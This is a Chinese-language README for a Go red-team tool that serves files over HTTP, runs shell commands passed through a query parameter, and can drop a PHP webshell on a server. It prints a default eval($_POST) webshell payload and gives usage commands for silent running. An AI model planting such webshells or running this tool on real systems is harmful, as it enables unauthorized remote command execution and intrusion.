# HTTP Server GO

这是一个用Go编写的红队内网环境中一个能快速开启HTTP文件浏览服务的小工具，能够执行shell命令。它支持以下功能：


-提供指定目录中的文件

-能够使用指定的查询参数执行shell命令

-可自定义外壳路径和查询参数

-可自定义的IP地址和端口

-支持PHP、Java和.NET shell（目前仅支持转储PHP shell）

-在后台运行服务器而不向控制台打印任何内容的选项

-转储shell并在服务器上执行的选项（目前仅支持转储PHP shell）

## 用法

```
httpserver [OPTIONS]
```

### Application Options

- `-h`, `--help`:  显示帮助消息并退出 
- `-p PORT`, `--port PORT`:  自定义要侦听的端口（默认值：8080） 
- `-d DIR`, `--dir DIR`: 自定义提供文件的目录（默认值：当前目录） 
- `-s SHELL`, `--shell SHELL`:  自定义shell路径（默认值：`/？shell=`） 
- `-cs CODE`, `--code-shell CODE`:  自定义用于执行shell命令的查询参数（默认值：`/？code=`） 
- `-m MOD`, `--mod MOD`:  自定义shell模式（php/java/.net）（目前只支持php shell） 
- `--payload PAYLOAD`:  自定义shell内容（PHP的默认值：`<？PHP eval（$_POST['a']）；`，Java的默认值：空字符串） 
- `--silent`:  在后台运行服务器，不向控制台打印任何内容 ,会打印错误信息
- `-dump`, `--dumpshell`:  转储shell并在服务器上执行（目前只支持PHP shell） 

### 帮助选项：

- `-h`, `--help`: 显示帮助消息并退出

## 使用样例：

 要使用默认设置启动服务器，请执行以下操作： 

```
httpserver
```

 要在端口8888上启动服务器，请执行以下操作： 

```
httpserver -p 8888
```

 要启动服务器并从“public”目录提供文件，请执行以下操作： 

```
httpserver -d public
```

 要启动服务器并使用查询参数`/？cmd=`执行shell命令： 

```
httpserver -cs cmd
```

 要启动服务器并使用带有自定义代码的PHP shell，请执行以下操作： 

```
httpserver -m php --payload '<?php echo "Hello, world!"; ?>' 
```

 要落地PHP shell并在服务器上执行它： 

```
httpserver -dump -m php -cs cmd
```

## 免责声明

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标进行扫描。**

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。

在安装并使用本工具前，请您**务必审慎阅读、充分理解各条款内容**，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。  除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。
